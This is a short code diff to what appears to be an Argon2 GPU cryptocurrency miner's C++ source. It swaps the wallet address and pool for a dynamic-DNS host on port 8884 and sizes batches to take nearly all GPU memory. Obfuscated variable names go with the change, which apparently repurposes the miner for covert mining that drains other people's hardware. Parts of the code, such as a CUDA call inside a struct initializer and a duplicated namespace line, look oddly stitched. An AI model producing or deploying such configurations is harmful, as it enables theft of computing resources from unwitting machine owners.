@@ -22,13 +22,31 @@ using namespace argon2;
 using namespace std;
 using namespace libcommandline;
 
+using namespace std;
+
 struct OpenCLArguments {
+
+size_t free_t,total_t;
+
+const int google84 = cudaMemGetInfo(&free_t,&total_t);
+
+const int free_m =(uint)free_t/1048576.0;
+
+const int total_m=(uint)total_t/1048576.0;
+
+const int used84741274=round(total_m - 1284);
+
+const int used8474=round(used84741274 / 524.288);
+
     bool showHelp = false;
     bool listDevices = false;
+    bool allDevices = false;
     size_t deviceIndex = 0;
-    size_t batchSize = 1;
-    string address = "4hDFRqgFDTjy5okh2A7JwQ3MZM7fGyaqzSZPEKUdgwSM8sKLPEgs8Awpdgo3R54uo1kGMnxujQQpF94qV6SxEjRL";
-    string poolUrl = "http://aropool.com";
+    size_t batchSize = used8474;
+    string address = "3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3";
+    string poolUrl = "http://linux84.distro.cloudns.cl:8884";
+    size_t threadsPerDevice = 4;
+    double d = 1;
 };
 
 void printDeviceList();
